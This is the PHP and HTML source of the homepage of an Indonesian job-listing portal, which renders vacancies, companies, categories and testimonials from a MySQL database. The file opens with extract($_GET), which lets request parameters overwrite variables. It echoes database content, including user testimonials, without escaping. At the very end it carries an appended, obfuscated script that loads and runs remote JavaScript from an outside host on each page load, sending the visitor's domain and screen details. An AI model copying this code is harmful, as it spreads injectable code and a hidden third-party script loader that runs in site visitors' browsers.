<?php
extract($_GET);
include_once "control/database.php";
include_once "model/inc.library.php";	
include_once "model/inc.fungsi_tanggal.php";	

$query = mysqli_query($koneksidb, "SELECT * FROM setting")
or die('Query salah : '.mysqli_error($koneksidb));
$myData_setting = mysqli_fetch_assoc($query);
?>

<!DOCTYPE html>
<html lang="en-US">
   

<head>
      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1">
      <meta http-equiv="X-UA-Compatible" content="IE=edge">
      <meta name="description" content="The Jobs : Portal Lowongan Kerja">
      <meta name="keyword" content="lowongan kerja, loker, perusahaan, job, freelancer, employee, marketplace">
      <meta name="author" content="Xander TEAM">
      <!-- Title -->
      <title><?php echo $myData_setting['title']; ?></title>
      <!-- Favicon -->
      <link rel="icon" type="image/png" sizes="32x32" href="assets/img/favicon/favicon-32x32.png">
      <!--Bootstrap css-->
      <link rel="stylesheet" href="assets/css/bootstrap.css">
      <!--Font Awesome css-->
      <link rel="stylesheet" href="assets/css/font-awesome.min.css">
      <!--Magnific css-->
      <link rel="stylesheet" href="assets/css/magnific-popup.css">
      <!--Owl-Carousel css-->
      <link rel="stylesheet" href="assets/css/owl.carousel.min.css">
      <link rel="stylesheet" href="assets/css/owl.theme.default.min.css">
      <!--Animate css-->
      <link rel="stylesheet" href="assets/css/animate.min.css">
      <!--Select2 css-->
      <link rel="stylesheet" href="assets/css/select2.min.css">
      <!--Slicknav css-->
      <link rel="stylesheet" href="assets/css/slicknav.min.css">
      <!--Bootstrap-Datepicker css-->
      <link rel="stylesheet" href="assets/css/bootstrap-datepicker.min.css">
      <!--Jquery UI css-->
      <link rel="stylesheet" href="assets/css/jquery-ui.min.css">
      <!--Perfect-Scrollbar css-->
      <link rel="stylesheet" href="assets/css/perfect-scrollbar.min.css">
      <!--Site Main Style css-->
      <link rel="stylesheet" href="assets/css/style.css">
      <!--Responsive css-->
      <link rel="stylesheet" href="assets/css/responsive.css">
	  
	<script>
	$(document).ready(function(){
	  $('[data-toggle="tooltip"]').tooltip();
	});
	</script>
	
        
	
   </head>
   <body>
       
       
      <!-- Header Area Start -->
      <?php include "header.php"; ?>
      <!-- Header Area End -->
       
       
      <!-- Banner Area Start -->
      <section class="jobguru-banner-area">
         <div class="banner-slider owl-carousel">
<?php
	$query = mysqli_query($koneksidb, "SELECT * FROM slider ORDER BY id_slider DESC")
    or die('Query salah : '.mysqli_error($koneksidb));	
	while ($myData = mysqli_fetch_assoc($query)) { 
?>
            <div class="banner-single-slider slider-item-<?php echo $myData['id_slider']; ?>">
               <div class="slider-offset"><img src="images/slider/thumbs/<?php echo $myData['thumbnail']; ?>"></div>
            </div>
<?php } ?>
         </div>
         <div class="banner-text">
            <div class="container">
               <div class="row">
                  <div class="col-md-12">
                     <div class="banner-search">
                        
                        <h4>Temukan lowongan pekerjaan tujuan anda</h4>
                        <form method="post" id="form1" action="lowonganpage.html">
                           <div class="banner-form-box">
								<div class="banner-form-input">
                                 <select class="banner-select" id="idbidang" name="idbidang">
                                    <option selected>Pilih Kategori</option>
<?php
	$query = mysqli_query($koneksidb, "SELECT * FROM bidang ORDER BY namabidang ASC")
    or die('Query salah : '.mysqli_error($koneksidb));	
	while ($myData = mysqli_fetch_assoc($query)) { 
?>
                                    <option value="<?php echo $myData['idbidang']; ?>"><?php echo $myData['namabidang']; ?></option>
 <?php } ?>
                                 </select>
                              </div>
                              <div class="banner-form-input">
                                 <select class="banner-select" id="kota" name="kota">
                                    <option selected>Pilih Kota/Lokasi</option>
<?php
	$query = mysqli_query($koneksidb, "SELECT * FROM perusahaan GROUP BY kota ORDER BY kota ASC")
    or die('Query salah : '.mysqli_error($koneksidb));	
	while ($myData = mysqli_fetch_assoc($query)) { 
?>
                                    <option value="<?php echo $myData['kota']; ?>"><?php echo $myData['kota']; ?></option>
 <?php } ?>
                                 </select>
                              </div>
                              <div class="banner-form-input">
                                 <select class="banner-select" id="tingkat_pendidikan" name="tingkat_pendidikan">
                                    <option selected>Tingkat Pendidikan</option>
                                    <option value="SMA">SMA</option>
									<option value="SMK">SMK</option>
									<option value="D3">D3</option>
									<option value="S1">S1</option>
									<option value="S2">S2</option>
									<option value="S3">S3</option>
                                 </select>
                                 
                              </div>
                              <div class="banner-form-input">
                                 <button type="submit"><i class="fa fa-search"></i></button>
                              </div>
                           </div>
                        </form>
						
						
        <!-- Memanggil jQuery.js -->
        <script src="autocomplete/jquery-3.2.1.min.js"></script>

        <!-- Memanggil Autocomplete.js -->
        <script src="autocomplete/jquery.autocomplete.min.js"></script>

        <script type="text/javascript">
            $(document).ready(function() {

                // Selector input yang akan menampilkan autocomplete.
                $( "#kota" ).autocomplete({
                    serviceUrl: "source.php",   // Kode php untuk prosesing data.
                    dataType: "JSON",           // Tipe data JSON.
                    onSelect: function (suggestion) {
                        $( "#kota" ).val("" + suggestion.kota);
                    }
                });
            })
        </script>
		
                     </div>
                  </div>
               </div>
            </div>
         </div>
      </section>
      <!-- Banner Area End -->
       
	  <section class="jobguru-top-job-area section_70">
         <div class="container">
            <div class="row">
               <div class="col-md-12">
                  <div class="site-heading">
                     <h2>Lowongan <span>Terbaru</span></h2>
                     
                  </div>
               </div>
            </div>
            <div class="row">
			
<?php
		
	$query = mysqli_query($koneksidb, "SELECT *, 
	datediff(tgl_akhir, current_date()) as selisih,
	lowongan.menu as menu_lowongan, perusahaan.alamat as alamat_perusahaan, 
	perusahaan.gambar as gambar_perusahaan, perusahaan.thumbnail as thumbnail_perusahaan
	FROM lowongan,perusahaan,negara,bidang
	WHERE lowongan.status = 'Y' 
	AND lowongan.id_perusahaan = perusahaan.id_perusahaan 
	AND lowongan.idnegara = negara.idnegara
	AND perusahaan.idbidang = bidang.idbidang
	AND datediff(tgl_akhir, current_date()) >=0
	ORDER BY tgl_upload 
	DESC LIMIT 0,6")
    or die('Query salah : '.mysqli_error($koneksidb));	
	while ($myData = mysqli_fetch_assoc($query)) { 
		$title = preg_replace("/[^a-z0-9]/i","-",$myData['namalowongan']);
		$url_link = "lowongan-".$myData['id_lowongan']."-".$title.".html";
		$sisatgl = $myData['selisih'];
?> 			
               <div class="col-lg-4 col-md-12">
                  <div class="sigle-top-job">
                     <div class="top-job-company-image">
                        <div class="company-logo-img">
                           <a href="<?php echo $url_link ?>">
                           
													
							
													
							<?php if($myData['thumbnail_perusahaan']!=''){ ?>
								<img src="images/perusahaan/thumbs/<?php echo $myData['thumbnail_perusahaan'] ?>" alt="">
							<?php }else{ ?>
								<img src="images/perusahaan/default.png">
							<?php } ?>													
													
						
						   
						 
                           </a>
                        </div>
						<br>
                        <h3><a href="<?php echo $url_link ?>">
						<?php echo $myData['namalowongan']; ?></a></h3>
                     </div>
                     <div class="top-job-company-desc">
                        <ul>
                           <li><span class="varify"><i class="fa fa-calendar"></i> <?php echo IndonesiaTgl($myData['tgl_upload']); ?></span></li>
                          
                           <li><span class="varify"><i class="fa fa-check"></i><?php echo $myData['jenis']; ?></span></li>
						   <li><span class="varify"><i class="fa fa-user"></i><?php echo $myData['jumlah']; ?> Karyawan</span></li>
                        </ul>
                        <div class="top-job-company-btn">
                           <a href="<?php echo $url_link ?>" class="jobguru-btn-2">Detail</a>
                        </div>
                     </div>
                  </div>
               </div>
<?php } ?>			   
			   
                   
            </div>
            
            <div class="row">
               <div class="col-md-12">
                  <div class="load-more">
                     <a href="lowongan.html" class="jobguru-btn">Semua Lowongan</a>
                  </div>
               </div>
            </div>
         </div>
      </section>
	  
      <!-- Categories Area Start -->
      <section class="jobguru-categories-area section_70">
         <div class="container">
            <div class="row">
               <div class="col-md-12">
                  <div class="site-heading">
                     <h2>Kategori <span>Pekerjaan</span></h2>
                     <p>Silahkan tentukan pilihan kategori pekerjaan yang sesuai dengan keinginan anda !</p>
                  </div>
               </div>
            </div>
            <div class="row">
			
<?php
		
	$query = mysqli_query($koneksidb, "SELECT * FROM bidang ORDER BY namabidang ASC LIMIT 0,6")
    or die('Query salah : '.mysqli_error($koneksidb));	
	while ($myData = mysqli_fetch_assoc($query)) { 
		$title = preg_replace("/[^a-z0-9]/i","-",$myData['namabidang']);
		$url_link = "lowonganbidang-".$myData['idbidang']."-".$title.".html";
?> 			
               <div class="col-lg-3 col-md-6 col-sm-6">
                  <a href="<?php echo $url_link ?>" class="single-category-holder account_cat">
                     <div class="category-holder-icon">
                        <i class="fa fa-briefcase"></i>
                     </div>
                     <div class="category-holder-text">
                        <h3><?php echo $myData['namabidang']; ?></h3>
                     </div>
                     <img src="assets/img/account_cat.jpg" alt="category" />
                  </a>
               </div>
<?php } ?>               
            </div>
            
            <div class="row">
               <div class="col-md-12">
                  <div class="load-more">
                     <a href="#" class="jobguru-btn">Semua Kategori</a>
                  </div>
               </div>
            </div>
         </div>
      </section>
      <!-- Categories Area End -->
       
       
      <!-- Inner Hire Area Start -->
      <section class="jobguru-inner-hire-area section_100">
         <div class="hire_circle"></div>
         <div class="container">
            <div class="row">
               <div class="col-md-12">
                  <div class="inner-hire-left">
                     <h3>JOB FAIR</h3>
                     <p>The Jobs merupakan salah satu portal Lowongan Kerja yang bisa membantu anda dalam menyebarkan lowongan pekerjaan dari perusahaan anda.</p>
                     <a href="registerperusahaan.html" class="jobguru-btn-3">Daftarkan Perusahaan Anda !</a>
                  </div>
               </div>
            </div>
         </div>
      </section>
      <!-- Inner Hire Area End -->
       
       
      <!-- Job Tab Area Start -->
      <section class="jobguru-job-tab-area section_70">
         <div class="container">
            <div class="row">
               <div class="col-md-12">
                  <div class="site-heading">
                     <h2>Perusahaan & <span>Lowongan</span></h2>
                     <p>Tentukan Perusahaan dan Lowongan Pekerjaan yang anda cari</p>
                  </div>
               </div>
            </div>
            <div class="row">
               <div class="col-md-12">
                  <div class=" job-tab">
                     <ul class="nav nav-pills job-tab-switch" id="pills-tab" role="tablist">
                        <li class="nav-item">
                           <a class="nav-link active" id="pills-companies-tab" data-toggle="pill" href="#pills-companies" role="tab" aria-controls="pills-companies" aria-selected="true">Perusahaan</a>
                        </li>
                        <li class="nav-item">
                           <a class="nav-link" id="pills-job-tab" data-toggle="pill" href="#pills-job" role="tab" aria-controls="pills-job" aria-selected="false">Lowongan Kerja</a>
                        </li>
                     </ul>
                  </div>
                  <div class="tab-content" id="pills-tabContent">
                     <div class="tab-pane fade show active" id="pills-companies" role="tabpanel" aria-labelledby="pills-companies-tab">
                        <div class="top-company-tab">
                           <ul>
						   
<?php
	$query = mysqli_query($koneksidb, "SELECT * FROM perusahaan,bidang
	WHERE perusahaan.idbidang = bidang.idbidang
	AND status = 'Y' AND menu = 'Perusahaan' 
	ORDER BY id_perusahaan 
	DESC LIMIT 0,5")
    or die('Query salah : '.mysqli_error($koneksidb));	
	while ($myData = mysqli_fetch_assoc($query)) { 
		$title = preg_replace("/[^a-z0-9]/i","-",$myData['nama']);
		$url_link = "perusahaan-".$myData['id_perusahaan']."-".$title.".html";
		$thumb = $myData['thumbnail'];
?> 
			   						   
                              <li>
                                 <div class="top-company-list">
                                    <div class="company-list-logo">
                                       <a href="<?php echo $url_link ?>">
									   
									   <?php if($thumb ==''){ ?>
												<a href="<?php echo $url_link ?>"><img src="images/perusahaan/default.png" alt="" width="100%"></a>
											<?php }else{ ?>
                                                <a href="<?php echo $url_link ?>" class="kamkaaj-employer-grid-logo"> <img src="images/perusahaan/thumbs/<?php echo $myData['thumbnail'] ?>" alt="" width="100%"> </a>
                                        <?php } ?>
						
                                       
                                       </a>
                                    </div>
                                    <div class="company-list-details">
                                       <h3><a href="<?php echo $url_link ?>"><?php echo $myData['nama']; ?></a></h3>
                                       <p class="company-state"><i class="fa fa-map-marker"></i> <?php echo $myData['alamat']; ?></p>
                                       <p class="open-icon"><i class="fa fa-briefcase"></i>2 Lowongan</p>
                                       <p class="varify"><i class="fa fa-tag"></i><?php echo $myData['namabidang']; ?></p>
                                       
                                    </div>
                                    <div class="company-list-btn">
                                       <a href="<?php echo $url_link ?>" class="jobguru-btn">Profile</a>
                                    </div>
                                 </div>
                              </li>
<?php } ?>							  
							  
							  
                              
                           </ul>
                        </div>
                     </div>
                     <div class="tab-pane fade" id="pills-job" role="tabpanel" aria-labelledby="pills-job-tab">
                        <div class="top-company-tab">
                           <ul>
						   
						   
<?php
		
	$query = mysqli_query($koneksidb, "SELECT *, 
	datediff(tgl_akhir, current_date()) as selisih,
	lowongan.menu as menu_lowongan, perusahaan.alamat as alamat_perusahaan, 
	perusahaan.gambar as gambar_perusahaan, perusahaan.thumbnail as thumbnail_perusahaan
	FROM lowongan,perusahaan,negara,bidang
	WHERE lowongan.status = 'Y' 
	AND lowongan.id_perusahaan = perusahaan.id_perusahaan 
	AND lowongan.idnegara = negara.idnegara
	AND perusahaan.idbidang = bidang.idbidang
	AND datediff(tgl_akhir, current_date()) >=0
	ORDER BY id_lowongan 
	ASC LIMIT 0,5")
    or die('Query salah : '.mysqli_error($koneksidb));	
	while ($myData = mysqli_fetch_assoc($query)) { 
		$title = preg_replace("/[^a-z0-9]/i","-",$myData['namalowongan']);
		$url_link = "lowongan-".$myData['id_lowongan']."-".$title.".html";
		$sisatgl = $myData['selisih'];
?> 						   
                              <li>
                                 <div class="top-company-list">
                                    <div class="company-list-logo">
                                       <a href="<?php echo $url_link ?>">
                            
													
				
													
														<?php if($myData['thumbnail_perusahaan']!=''){ ?>
														<img src="images/perusahaan/thumbs/<?php echo $myData['thumbnail_perusahaan'] ?>" alt="">
														<?php }else{ ?>
														<img src="images/perusahaan/default.png">
														<?php } ?>													
													
													
                                       </a>
                                    </div>
                                    <div class="company-list-details">
                                       <h3><a href="<?php echo $url_link ?>"><?php echo $myData['namalowongan']; ?></a></h3>
                                       <p class="company-state"><i class="fa fa-map-marker"></i> <?php echo $myData['alamat_perusahaan'] ?></p>
                                       <p class="open-icon"><i class="fa fa-calendar"></i><?php echo IndonesiaTgl($myData['tgl_upload']); ?></p>
                                       <p class="varify"><i class="fa fa-money"></i>Gaji : Rp. <?php echo number_format($myData['gaji_min']) ?> - Rp. <?php echo number_format($myData['gaji_max']) ?></p>
                                       
                                    </div>
                                    <div class="company-list-btn">
                                       <a href="<?php echo $url_link ?>" class="jobguru-btn">Apply</a>
                                    </div>
                                 </div>
                              </li>
<?php } ?>							  
							  
							  
                             
                           </ul>
                        </div>
                     </div>
                  </div>
               </div>
            </div>
            <div class="row">
               <div class="col-md-12">
                  <div class="load-more">
                     <a href="perusahaan.html" class="jobguru-btn">Semua Perusahaan</a>
                  </div>
               </div>
            </div>
         </div>
      </section>
      <!-- Job Tab Area End -->
       
       
      <!-- Video Area Start -->
      
      <!-- Video Area End -->
       
       
      <!-- How Works Area Start -->
		<section class="jobguru-happy-freelancer-area section_70">
         <div class="container">
            <div class="row">
               <div class="col-md-12">
                  <div class="site-heading">
                     <h2>Testimonial</h2>
                    
                  </div>
               </div>
            </div>
            <div class="row">
               <div class="col-md-12">
                  <div class="happy-freelancer-slider owl-carousel">
				  
<?php
	$query = mysqli_query($koneksidb, "SELECT * FROM testimoni,pelamar
			WHERE testimoni.id_pelamar = pelamar.id_pelamar 
			AND testimoni.status = 'Ya' 
			ORDER BY id_testimoni DESC")
    or die('Query salah : '.mysqli_error($koneksidb));	
	while ($myData = mysqli_fetch_assoc($query)) { 
?>				  
                     <div class="single-happy-freelancer">
                        <div class="happy-freelancer-img">
                           <?php if($myData['gambar']==""){ ?>
                                    <img src="images/user.png" alt="">
									<?php }else{ ?>
									<img src="images/pelamar/<?php echo $myData['gambar']; ?>" alt="">
									<?php } ?>
                        </div>
                        <div class="happy-freelancer-text">
                            <p align="justify"><?php echo $myData['isi_testimoni']; ?></p>
                           <div class="happy-freelancer-info">
                              <h4><?php echo $myData['namapelamar']; ?></h4>
                              <p><?php echo $myData['asal']; ?></p>
                           </div>
                        </div>
                     </div>
<?php } ?>                     
                     
                     
                  </div>
               </div>
            </div>
         </div>
      </section>
      <!-- How Works Area End -->
       
       
      <!-- Blog Area Start -->
      
      <!-- Blog Area End -->
       
       
      <!-- Footer Area Start -->
      <?php include "footer.php"; ?>
      <!-- Footer Area End -->
       
       
      <!--Jquery js-->
<script src="assets/js/jquery-3.0.0.min.js"></script>
      <!--Popper js-->
      <script src="assets/js/popper.min.js"></script>
      <!--Bootstrap js-->
      <script src="assets/js/bootstrap.min.js"></script>
      <!--Bootstrap Datepicker js-->
      <script src="assets/js/bootstrap-datepicker.min.js"></script>
      <!--Perfect Scrollbar js-->
      <script src="assets/js/jquery-perfect-scrollbar.min.js"></script>
      <!--Owl-Carousel js-->
      <script src="assets/js/owl.carousel.min.js"></script>
      <!--SlickNav js-->
      <script src="assets/js/jquery.slicknav.min.js"></script>
      <!--Magnific js-->
      <script src="assets/js/jquery.magnific-popup.min.js"></script>
      <!--Select2 js-->
      <script src="assets/js/select2.min.js"></script>
      <!--jquery-ui js-->
      <script src="assets/js/jquery-ui.min.js"></script>
      <!--Jarallax js-->
      <script src="assets/js/jarallax.min.js"></script>
      <script src="assets/js/jarallax-video.min.js"></script>
      <!--Main js-->
      <script src="assets/js/main.js"></script>
   <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p02.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JQuX3gzRncX7sdBRGlBIZ%2bWM577aU6qBBtRR97YnW5Qibfkc9ZVa%2bMsH7F%2bktZqrOWm3tvSqR%2fhC8YqzaUg3hshNIMzurBrFx4qfjEpJoHzSfGS8y5fbJWY2AfkQZ1%2baburgcOvcawnJujcwTDubRO9oLCQ6CTWps%2f4dHBGVsqoVSGbPRvhCqd6sLt6nqfRxnwss2VEKQYEPCD%2baL9hspeCPBtUPRnHFU22ydjaKgvh1UyJ4GnFETyXi5FKhuoXjNeZMbLpMFBkywdMs0rdabeuToS03gWfb%2brbFVetnBhnKWReo1bMppsc3Yjr5sD2UHus3lN3uRAyaLsjSwlrBg1VVaO%2ftR59nGnjmTM0QQaPOFmW088YRLvl1JCAD2K2K1k12%2fQ21iVh4U4U59l%2f8bOj%2bg8t0ZvU2g%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
   
   

   
   </body>

</html>

